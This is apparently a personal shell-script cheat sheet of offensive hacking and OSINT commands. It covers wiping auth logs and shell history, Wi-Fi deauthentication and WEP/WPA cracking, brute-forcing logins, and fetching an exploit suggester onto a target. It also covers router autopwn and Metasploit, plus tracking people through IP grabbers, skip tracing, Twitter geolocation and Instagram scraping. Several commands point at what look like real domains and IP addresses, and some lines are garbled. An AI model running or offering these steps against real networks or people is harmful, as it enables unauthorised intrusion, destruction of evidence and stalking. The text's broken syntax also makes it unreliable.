#!/bin/sh

#  commands.sh
#  
#
#  Created by a-robot on 3/14/22.
#                                

## To add new user 
useradd -r user2 


# pre-engagement || reconassance || vulnerability assessment || exploitation || post exploitation || reporting 



#### Git Clones ### 
git clone 'https://github.com/ctxis/crackerjack'




#### FOR BROWSER PLUGINS (OSNIT, SELF SECURITY)
# https://inteltechniques.com/ 
# ## throw-away email ## 
# tempmailer.de 
# https://api.wigle.net/
# https://null-byte.wonderhowto.com/how-to/wardrive-android-phone-map-vulnerable-networks-0176136/
# grabify.link 
# shodan.io
# https://nvd.nist.gov/developers/vulnerabilities
# https://www.exploit-db.com/


https://github.com/issamelferkh/userrecon
#### becom frame vs probe-frame ### 
# AP constantly sends out becon frames to advertise its nearby and avaiable 
# probe frames --> include the name of recent networks connected to. [susseptible to faux networks]
# snoof AP 

## noisy--> diguise packets hidden behind prexisting servers (by generaitng random traffic)#
## --> best if used if you think someone is spying on you or the network 
pip install requests
git clone https://github.com/1tayH/noisy.git
cd noisy

python noisy.py --help

nano config.json
## ADD SITES TO CONFIG FILE 
python noisy.py --config config.json




## CANARY TOKENS --> Use to Log Data on People 
canarytokens.com/generate 

## quick assessment 
nmap -sV xxx.xxx.x/24 -p 80




####### LOGS #########
kill -9 $$ ## exits the terminal without saving history 
wget https://raw.githubusercontent.com/sundowndev/covermyass/master/covermyass
chmod +x covermyass
./covermyass
# BASH HISTORY 
cd /dev/shm/
rm /root/.bash_history 
## or edit the var $HISTSIZE and $HISTFILESIZE 
# AUTH-LOG FILES 
cd /var/log
sudo rm auth.log 
shred -zu /var/log/auth.log ## safely overwrite logs with 0's and 1's 
truncate -s 0 /var/log/auth.log 


## basics
iwevent -- to get wireless events
iwgetid - reports curretn essid / ap

### PROXYCHAINS (COVERRING TRACKS) ###
# EDIT CONFIG /ETC/PROXYCHAINS.CONF
sudo apt-get install -y proxychains
proxychains nmap ip/24 
proxychains tor 



### MANGLE TTL 
# WINDOWS 
netsh int ipv4 set glob defaultcurhoplimit=65
netsh int ipv6 set glob defaultcurhoplimit=65
netsh int ipv6 set glob defaultcurhoplimit=128 # <-- RESET BACK TO DEFUALT 

### LINUX (default ttl=64)
iptables -t mangle -I POSTROUTING 1 -j TTL --ttl-set 66


#### OBSUCATE CODE --> GRAPHITTI #### 
## USES PYTHON 2.0
git clone https://github.com/Ekultek/Graffiti
cd Graffiti
python2 graffiti.py -h 
python2 graffiti.py -l 
python2 graffiti.py -Vc 





OPEN SSL ENCRYPTION
Private key
openssl genrsa -aes-256-cbc -out macair.key 4096
openssl genrsa -aes-256-cbc -out macair.key 4096
# Public key
openssl rsa -in frank.key -pubout > frankpublic.key
# verification file
### making signed encryption
openssl dgst -sha256 -sign macair.key -out signer verifcation.enc
# to sign
openssl base64 -in signer -out verifcation.enc


##### INTRUSION DETECTION #### 
# Sparrow Wifi # --> 
https://github.com/ghostop14/sparrow-wifi
gpsd -D 2 -N /dev/ttyUSB0 # WARDRIVING --> graphs 
sudo ./sparrow-wifi.py 


### KISMET - FIND ALL THE NETWORK HOST, AND DEVICE MANU

#### TO MIRROR WEBPAGE DATA (EXACT COPY)
sudo apt install httrack webhttrack
httprack -w domain.com


## USER RECON --> ACTIVE SOCIAL MEDIA PAGES ##
git clone 'https://github.com/issamelferkh/userrecon' 
./userrecon.sh 

git clone 'https://github.com/sherlock-project/sherlock'
cd sherlock
python3 -m pip install -r requirements.txt
python3 sherlock user123
python3 sherlock user1 user2 user3


#### IMAGE GEO LOCATION #### 



########################
### OSNIT / SPY BLUETOOTH #### 
## unlike wifi, bluetooth negotates a key ones and stores it. this happens on first handshake, making packet inseretion and listneing harder 
# https://null-byte.wonderhowto.com/how-to/bt-recon-snoop-bluetooth-devices-using-kali-linux-0165049/
hciconfig -h ## bluetooth context manager, similar to wifi manager (help menu)
man hciconfig 
man hcitool 
man sdptool  ## allows queries on bluetooth servers --> permeessions / avail services 
man btscanner 

hciconfig dev_name up 
sdptool browse MAC_ADDRESS 
btscanner # launches GUI interface 

#### BETTERCAP (ettercap replacement) ####
# https://null-byte.wonderhowto.com/how-to/target-bluetooth-devices-with-bettercap-0194421/
apt install golang
go get github.com/bettercap/bettercap
cd $GOPATH/src/github.com/bettercap/bettercap
make build
sudo make install
sudo bettercap

192.168.0.0/24 > 192.168.0.37  ?? net.show
192.168.0.0/24 > 192.168.0.37  ?? ble.recon on ### BLUETOOTH SNIFFING MODULE 
192.168.0.0/24 > 192.168.0.37  ?? ble.show  ### IDENTIFY HOSTS TO PROBE 
192.168.0.0/24 > 192.168.0.37  ?? ble.enum 56:73:e6:ea:ce:c5 ### SCAN AND INTERACT W/ DEVICES   
192.168.0.0/24 > 192.168.0.37  ?? ble.write 7e:dc:48:7c:77:ea 69d1d8f345e149a898219bbdfdaad9d9 ffffffffffffffff ### writting fffff to the writeable field found 

##
bettercap 
ble.recon on  ## returns the range and device name of enabled BT devices 
ble.recon off 
ble.show 
ble.enum MAC_ADDRESS  # PROVIDES MORE INFO ON BLUETOOTH DEV 







## lookoups####                                            2 ???
proxychains firefox
ike-scan
dnstracer dedicatedglass.com
Nslookup dedicatedglass.com
(to get dns)
Ping -a dedicatedglass.com
tlssled 192.168.50.1                                                    2 ???
sslscan -h dedicatedglass.com
Recon-ng                                      2 ???
To grab SSL certificates
sslyze --regular website or ip
nslookup IP >> nslookup.txt
http://geoiplookup.net/


########## DNS LOOKUPS ############
## host, nslookup, dig 
host domain.com ## returns host IP and mailserver 
host -t ns domain.com 
host -t mx domain.com 
host ip_address # reverse dns 

nslookup domain.com 
nslookup  # to enter nslookup console 
# webserver
set type=ns 
domain.com 
# mail server 
set type=mx
domain.com 

dig --help 
dig domain.com 
dig domain.com -t mx 
dig domain.com -t ns 
dig domain.com AAAA # ipv6 addresses 


##################################


#### JOHN THE RIPPER ### 
rar2john $HASHED_FILE
rar2john $HASHED_FILE > hash.txt 
john --format=zip hash.txt 


#### WIRESHARK #### 


#### MANGLED TTYL (FREE WIFI AP ACCESS) ######


radio_name = $(iw dev | awk) '$1=="Interface"{print $2}'

#### AIRMON-NG // SUITE ### 
aireplay-ng -0 0 mac -c mac_of_radio radio_name 
airemon-ng start external_radio 6 # the number is the channel 
kismet -c radio_name  ## GETS THE MAC ADDRESS 

### IFRENAME ### 
ifrename # to rename wireless 
iwevent # display wireless events 
iwgetid # reports current essid 
iwlist # scan savailable aps or essid 
iwspy # monitors iw nodes and records strenght and quality of signal 


##### NMCLI #####
nmcli general status 
nmcli general hostname # get and change sys hostname 
nmcli general permissions # show the permssions available to caller 
nmcli connection show --active 
nmcli modify 

nmcli networking on off # disable network control management 
nmcli networking connectivity 

nmcli radio all   ## show status for all devices 
nmcli radio wwan  ## for tethered devices 
nmcli radio wifi  ## show status for wifi devices 

nmcli device status
nmcli device showstatus
nmcli device showstatus wlan0 
nmcli device wifi connect # connect to near hotspot
nmcli device wifi hotspot # create a wifi hotspot 

wifi-show-password

######### TO DISPLAY AND SHOW USB DEVICES #### 
lspci 
lscpu
lsusb
lsblk
lslo 
lsslcb
lshw 



## to get available ESSID 
sudo iwlist [nic name] scan | grep ESSID 
nmcli dev wifi 



#### TO CREATE CUSTOM AP ### 
wpa_supplicant/hostap 
hostapd # to create AP for wifi sharing 
wpa_supplicant # allows scanning and connection to AP 

#### IP2ROUTER --> File sharing / hosting 
i2prouter start 

### INSTALL ALL KALI DEPENDENCIES 
apt install kali-linux-everything 




############ NMAP #############
#### KEYS ### 
# -A -> OS INFO 
# -sV -> list running svc on port 
# -Pn -> ignore if up / down 
## -Sv  nmap to return open ports and services (specific device)
## -v adds verbosity 
# cd /usr/share/nmap/scripts ## to find nmap vuln scripts 
## nmap -v == add verbosity 
# nmap --reason --> why port is in its state 
# nmap --packet-trace --> shows all send/recv packets 
# nmap --opem xxx.xxx 

#############################
nmap -sV -pN xx # basic nmap scan 
nmap 192.xxx -oX /dir/file.xml ## to output nmap to .xml 
nmap -A -Pn xxx/0/24 # os scan 
nmap -sA xxxx # tcp-ack scan --> unfilterd and filtered ports
nmap -sI zombiehost.com domain.com 
nmap -sW xxx # window scan 

nmap -sV host,com -scrip dns-brute ## chain script 


sudo nmap -sV -Pn -v ns8231.hostgator.com (#port knocking)
Sudo nmap -A -Pn  -v 76.172.85.231
nmap -sI -v google.com 192.168.50.1                                        2 ???
nmap -sW -v 192.168.50.1
nmap -sn -v - A--version-intenstity=9 192.168.0.0/24 ## nmap to find who's on Lan (subnet) #####

cd /usr/share/nmap/scripts
nmap --script nmap-vulners/ -sV -sS -Pn -A -v 192.168.50.1/24 --version-intensity=9
nmap -sV --script=vulscan/vulscan.nse 192.168.50.111
nmap --script nmap-vulners/ -sV www.securitytrails.com
nmap --script nmap-vulners/ -sV 11.22.33.44
nmap --script nmap-vulners/,vulscan/ -sV yourwebsite.com
nmap -Pn --script vuln 192.168.1.105
echo "scanning for open ports"
nmap -iL probed.txt -T5 -oA scans/port_scan.txt -V

echo "scanning for open ports"
nmap -iL probed.txt -T5 -oA scans/port_scan.txt -V

nmap -Sn xxx.xxx # ping scan 
nmap -sL # list scan, returns device name 
nmap -Pn # returns oepn ports . devname and mac address
nmap -Sn --traceroute xxx.xx/24 
nmap -Sn # ping scan 
nmap -sL # list scan returns device and if its up or down 
nmap -Pn # returns oepn port, best used with direct IP 
nmap -Sn --traceroute ip/24 
nmap ip.25 -p1-6000 # specify port 
nmap -sV # find the service version 
nmap -sV xxx.xxx --version-intensity=9
nmap -o xxx --oscan-guess 
nmap -A xx.xx version-intensity=9 
nmap -sV -A --script=vulners ip --version intesnsity=9 
nmap -sV -A xxx.xxx --version-intesity=9 

## php vulnerability
nmap -sV --script=http-php-version testphp.vulnweb.com
nmap 192.168.50.1 -oX /home/frank/nmapout.xml
nmap cpanel.dedicatedglass.com/24 -oX /home/frank/nmap.xml
sudo nmap -sP -n 192.168.0.0/24 ## nmap to return mac address
sudo nmap -sV --scripts=vulscan xxxx 



#############################



airodump-ng wlx0013eff5483f -c 11
netdiscover -r 192.168.50.1/24
airodump-ng wlx0013eff5483f --encrypt wep
sudo iwlist wlx0013eff5483f scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'

#### TO GET DEVICES AND DISTANCE
sudo iw dev wlx0013eff5483f scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sort

##### TO FIND WEP PROTECTION ####
airodump-ng wlx0013eff5483f --encrypt wep




#### BRUTE FORCE ####
## BRUTESPRAY --> requries nmap fiel
apt install brutespray 
brutespray --file nmapout.xml --threads 5
brutespray -file nmapout.xml -t 5 -s ftp
brutespray --file nmapfuad.xml -U names.txt -P milw0rm-dictionary.txt --threads 5
brutespray --file nmapfuad.xml -U /home/frank/names.txt -P /home/frank/milw0rm-dictionary.txt --threads 5

sudo apt install ncrack
ncrack -u users.tx -p passwords.txt 

sudo apt-get install hydra-gtk
sudo apt-get purge hydra-gtk && sudo apt-get autoremove && sudo apt-get autoclean
hydra -L users.txt -P passwords.txt location_pass.txt 
pantor ftp_login host=ip , user=users.txt password- pass.txt 0=users.txt 1=passwords.txt 



###### DEEP OSNIT ### THE HARVESTER #######
cd /home/frank/the_harvester
python3 theHarvester.py -d dedicatedglass.com -l 500 -b all


#### PHOTON SCANNER ######
# https://null-byte.wonderhowto.com/how-to/use-photon-scanner-scrape-web-osint-data-0194420/
## photon focuses on data for password hasshes, api keys, and 3rd party ninja query. 
#[DOCS] https://github.com/s0md3v/Photon
# -t threads , --stdout, --ninja, --wayback (use archive.org for old dirs), --dns (dns dump)
pip install tld requests
git clone https://github.com/s0md3v/Photon.git
cd Photon
python3 photon.py -h

sudo python3 photon.py -u 'domain.com' --verbose 
sudo python3 photon.py -u 'domain.com' --keys --dns -t 3

python3 photon.py -u https://www.priceline.com/ --dns
python3 photon.py -u https://www.pbs.org/ --keys -t 10 -l 3 ### EXTRACT SECRET KEYS 
python3 photon.py -u https://www.pbs.com/ --keys -t 10 -l 1 --ninja ### NINJA MODE 


#####################################
#### TWINT --- TWITTER OSNIT 
# https://null-byte.wonderhowto.com/how-to/mine-twitter-for-targeted-information-with-twint-0193853/
# [MAN] https://github.com/twintproject/twint
pip3 install --upgrade -e git+https://github.com/twintproject/twint.git@origin/master#egg=twint
git clone https://github.com/twintproject/twint.git
cd twint
pip3 install -r requirements.txt
pip3 install twint

sudo twint -h
twint --help 
sudo twint -g="34.0343535, -117.23414142,2km" --search 'fish shack' --email --phone  ## find discussinon about a business 
sudo twint -u realdonaldtrump -g='34.39343535, -118.234234252,2km'
sudo twint -u realdonaldtrump --search 'loser' -o trump.txt 


######################################


#########  metasploit # ###########
Msfconsole
Search samba_symlink_traversal
Use / dir to exploit
Show options
Set option IP (look for required)
Exploit (to run export)


###### SEARCHSPLOIT --->> ALLOWS ACCESS TO EXPOOIT-DB DATABASE ####
# https://github.com/offensive-security/exploitdb
searchsploit -h

# kali 
sudo apt -y install exploitdb
sudo apt -y install exploitdb-bin-sploits exploitdb-papers

# ubuntu
sudo git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb
sudo ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit

# darwin 
brew update && brew install exploitdb



######## LOCALIZED INFO ######
ALL HARDWARE INFO
Apt install infix
Infix -Fxz

DIRS=$(ls *.txt)
broadcast = $(ifconfig | grep broadcast)
mac = $(ifconfig | grep mac)


##### OSNIT #####
Phonenumbers scanner
phoneinfoga scan -n <number>
phoneinfoga scan -n "+1 (555) 444-1212"

# SKIP TRACER (REVERSE-LICENSE LOOKPI)
git clone https://github.com/xillwillx/skiptracer.git skiptracer
cd skiptracer 
pip install -r requirements.txt
python skiptracer.py -l (phone|email|sn|name|plate)
 

######## OSNIT ###########
### Social media accounts#####
Pyhton3 sherlock.py username
online OSNIT
https://api.wigle.net/
https://www.nirsoft.net/ (look thins up, powerful tool)
http://geoiplookup.net/ ### GEO IP LCOATIONS
tracemyip.org
inteltechniques.com 

##### GRABIFY #########
## --> grabify.link

#### Osintgram -- INSTAGRAM OSNIT 
## echo the ig dummy user account and set to .conf file (#3)
## need to create username.conf, pw.conf and settings.json 
git clone 'https://github.com/Datalux/Osintgram' 
pip3 install -r requirements.txt 
echo 'ig_dummyacct' > username.conf 
echo 'ig_dummyPass' > pw.conf
echo '{},' > settings.json 
python3 main.py ig_TARGET 
list # displays available commands 

 

##################



### to create fake AP ###
https://cybergibbons.com/security-2/quick-and-easy-fake-wifi-access-point-in-kali/
cd
/etc/hostapd
nano hostapd.conf
./hostapd.conf
iwevent

## WIRESHARK CLI ###
tshark -D
tshark -i 2 -i 5 -i 6
tshark -i 2 -i 5 -i 6 > firstWIRE.csv
tshark -i wlx0013eff5483f
tshark -i wlx0013eff5483f -i any (## all interfaces)


## send deauth
#1 find mac for router (-a) and client (-c)
netdiscover -r 192.168.50.1/24
aireplay-ng --deauth 90000000 -a F0:2F:74:2C:7E:88 -c 9a:26:55:ed:ef:84 wlo1

### CRACKING WEP / WPA ####
besside-ng en0 -c 6 -b
airodump-ng wlx0013eff5483f --encrypt wep


#### GOOGLE DORKS ###
# TO FIND NONSECURE LINKS ON WEBSERVER
site:dedicatedglass.com inurl:http
# TO DORK FOR LOGFILES
Allintext:password textfile:log after:2018



### WEBSERVER ENUMERATION ###
apt install whatweb ip 
whatweb -4 domain.com 

## to get dns info 
dnsrecon -d domain.com
whatweb domain.com 

python rsf.py 

### TO ENUMERATE SUBDOMAINS sublist3r
wget https://github.com/aboul3la/Sublist3r/archive/master.zip
unzip master.zip
./sublist3r.py -d yourdomain.com
## look thru namesystem for hidden 
sudo apt install dirbuster
	
### WEB BASED VULNS ###
git clone https://github.com/droope/droopescan.git
apt install python-pip
pip install droopscan
pip install -r requirements.txt
./droopescan scan --help
## doopscan to scan vulnrable webservers 
droopscan scan drupal -u URL_HERE
droopscan scan silverstripe -u URL_HERE
./droopescan scan --help
droopescan scan drupal -u example.org
droopescan scan drupal -U list_of_urls.txt
droopescan scan -U list_of_urls.txt

python skiptracer.py -l (phone|email|sn|name|plate)
 

## Nikto for webserver vuln scans
git clone https://github.com/sullo/nikto
# Main script is in program/
cd nikto/program
# Run using the shebang interpreter
./nikto.pl -h http://www.example.com
# Run using perl (if you forget to chmod)
#### ONENVAS (NESSUS CLONE) VULN SCAN ### 
apt install openvas 

## ARP SCAN 
echo ('enter pass:')
read pass
$(arp-scan -l | grep Raspberry | awk '{print $1}') root $pass
apt-get update && apt-get install sparta python-requests


## password crackers 
hashcat 
scp <file to upload> <username>@<hostname>:<destination path>
scp -r <directory to upload> <username>@<hostname>:<destination path> # dir scp
echo "put files*.xml" | sftp -p -i ~/.ssh/key_name username@hostname.example #u using relative loc
sftp -b batchfile.txt ~/.ssh/key_name username@hostname.example # using batch in text


### MAC ADDRESS RANDOMIZATION ( CELL PHONES )
## CONNECTING TO PUBLIC PORTALS  --> swap mac address on whitelist with an already authorized Mac address 
# 1. put card into wiresless monitor mode 
# 2. find exisitng users on the whitelist. find the channel of ESSID 
# 3. copy the mac connected to router. 
sudo apt-get install macchanger aircrack-ng 
sudo iwconfig wirelessInterface down 
sudo macchanger -r wirelessInterface 
ip a # to find current NICs in use 
sudo airmon-ng start wirelessInterface # to put in into monitor mode 
sudo airodump-ng wirelessInterface -c 11 --encrypt OPN # to see only open networks --> displays list of connected devices on network 
sudo ifconfig nicNonMonitorMode down 
sudo macchanger -m newMacfromabove nicNonMonitormode 
sudo ifconfig nicNonMonitorMode up 


### RECON-NG --> contains modules simular to metasploit 
##### GREAT FOR OSNIT 
git clone 'https://github.com/lanmaster53/recon-ng'
workspaces add ws1 ## CERATE WORKSPACE
show workspaces 
workspaces select default 
show modules 
add domains ### USE THIS THIS TO ADD TO DATA TABLE FOR EXPLOIT 
show domains 
add companies 
show companies 
search whois # displays modules that exist for whois 
use whois_pocs 
show info ## displays module info and the data structure user provided 
show # displays information to be used in console 
show dashboard ## shows all current activities / tasks peformed 
add # need to 
#####################################

# airgeddon (wireless attack framework including BULLY) must use  pixiedust too (not in airegeddon)
### BYPASSING WPA WIRELESS SECURITY (BRUTEFORCE WIFI PIN, RATHER THAN WPA)
# https://nulb.app/x49tg 
# install airgeddon dependenacies 
# command 2, then command 8 
# once the search is used-- leverage pixy dust, optin 7
git clone 'https://github.com/v1s1t0r1sh3r3/airgeddon'
sudo ./airgeddon.sh  ## setup config 
option 2, then option 8, then option 4 (to explore)
ohce process is done, use option 7 for pixiedust 


##### LINUX SHELL EXPLOITATION ####### 
# https://null-byte.wonderhowto.com/how-to/find-exploits-get-root-with-linux-exploit-suggester-0206005/
# 1. set up http server on host computer 
# 2. use client to upload the exploit (wget les2.pol--> [abbreviated name]) 
# 3. 

wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
python3 -m SimpleHttpServer ## log the server IP 
# or 
python2 -m SimpleHttpServer 
### GO TO TARGET COMPUTER 
wget xxx.xxx/les2.pl # from SimpleHttpServer on to target machine 
chmod +x les2.pl 
./les2.pl ## to run the module --> its on the target PC 


###### TIDoS ---> probe webapps for vulnerabilities 
# https://null-byte.wonderhowto.com/how-to/probe-websites-for-vulnerabilities-more-easily-with-tidos-framework-0193854/
git clone https://github.com/0xinfection/tidos-framework.git
cd tidos-framework
sudo apt-get install libncurses5 libxml2 nmap tcpdump libexiv2-dev build-essential python-pip default-libmysqlclient-dev python-xmpp
sudo pip2 install -r requirements.txt 
chmod +x install
./install
sudo tidos 


######### NESSUSS #############
# TO DISCOVER NETWORK HOSTS 
# IDENTIFIY CRITICAL INFO / PERFORM VULN SCAN 
# GENERATE REPORTS 

https://www.tenable.com/products/nessus
https://localhost:8834/

#####################################

######## OPENVAS ##########
git clone 'https://github.com/greenbone/openvas-scanner'
cmake .
make install




####### NIKTO VULN-SCANNER ######### 
# https://github.com/sullo/nikto/wiki
# http://bit.ly/NiktoScan

brew install nikto 
sudo apt install nikto 
## SSL 
nikto -h domain.org -ssl # ssl scan 
ipcalc local_ip_domain 
## IP ADDRESS FROM NMAP 
nmap -p local_ip_doman/24 -oG nmap_out.txt 
cat nmap_out.txt | awk '/Up$/{print $2}' | nikto -h | cat >> targetIP.txt # awk returns just IP address.. may ahve to play around with $ val 
cat targetIP.txt 
nikto -h targetIP.txt 
## Webserver 
nikto -h www.hell.com | cat >> niktoResults.txt 
nikto -h www.domain.com -Format msf+ 


### LAZY SCRIPT --> WIFI VULN ###
# https://null-byte.wonderhowto.com/how-to/hack-wi-fi-networks-more-easily-with-lazy-script-0185764/
cd
git clone https://github.com/arismelachroinos/lscript.git
cd lscript
chmod +x install.sh
./install.sh
iwconfig wlan0 mode monitor
ip a



###3 ROUTERSPLOIT --> ROUTERS, WEBCAM, ANY BROADCASTED DEVICE ### 
# https://null-byte.wonderhowto.com/how-to/seize-control-router-with-routersploit-0177774/
# AutoPwn 
#
sudo apt-get install python3-pip requests paramiko beautifulsoup4 pysnmp
git clone https://github.com/threat9/routersploit
cd routersploit
python3 -m pip install -r requirements.txt
python3 rsf.py

#### (Install for mac os)
git clone https://github.com/threat9/routersploit
cd routersploit
sudo easy_install pip
sudo pip install -r requirements.txt
#
cd
cd routersploit
sudo python ./rsf.py
##
show all # Everything on RS 
# scanning a target 
use scanners/autopwn 
show options ## shows the variales chosen for module seleted ^ 
set target xxx.xxx.xxx
run 
use exploits/routers/3com/3cradsl72_info_disclosure ## to run specific exploit after scan run 
show options
set target <target router IP>
check
run 


######################################

#### Basic Enumeration With Metasploit and Nmap  #### 
### use netdiscover or arp -a for local network
ls -al /usr/share/nmap/scripts/  
netdiscover -i eth0 -r 192.168.50.xxx/24 
nmap -sn 192.168.50.xxx/24 
# look for target OS and service versions (pay attention to service versions for exoit and vuln scan)
# pay attention to ftp timeout 
# pay attentin to CVE number--> look online for exploit detials 
nmap 192.168.50.TARGET_IP # scans 1000 of most common ports 
nmap  -sS -A -T1 -p- 92.168.50.TARGET_IP -oN target_info_nmap.txt 
ls -al /usr/share/nmap/scripts/ | grep -e "ftp-" 
nmap -sV -p 21  192.168.50._TARGET_IP --script /usr/share/nmap/scripts/FTP_SCRIPT_DUMMY
searchsploit FTP_SCRIPT_DUMMY 
msfconsole 
search FTP_SCRIPT_DUMMY 
use FOUND_MODULE_FROM_MFS 
set RHOSTS 192.168.TARGET_IP 
run 

# if root privledage is granted, start exexuting 
#######################################



######################################
######## OPEN SSL #######
# use private key to sign secret.enc. 
openssl genrsa -aes-256-cbc -out newkey.key 4096 # generate pvt key 
openssl rsa -in newkey.key -pubout > public.key # to generate public key 
openssl rsatl --encrypt -inkey private.key -pubout > public.key -pubin -in messsage.txt -out message.enc ## encrypt a file 
openssl rsatl --decrypt -inkey myprivate.key -in message.enc > clear_view.txt 
openssl genrsa -des3 -out another_pvt_key.key 4096 ## to derive anothers public key 

openssl rsautl --decruypt -inkey bob-put.key -in secret.enc > message.txt  # to decrypt mesg
openssl dgst -sha256 -sign private.key -out signer secret.enc
openssl base64 -in signer -out my_signature # to sign ssl 
openssl dgst -sha256 -verify anothers_pub_key.key -signature signer secret.enc 






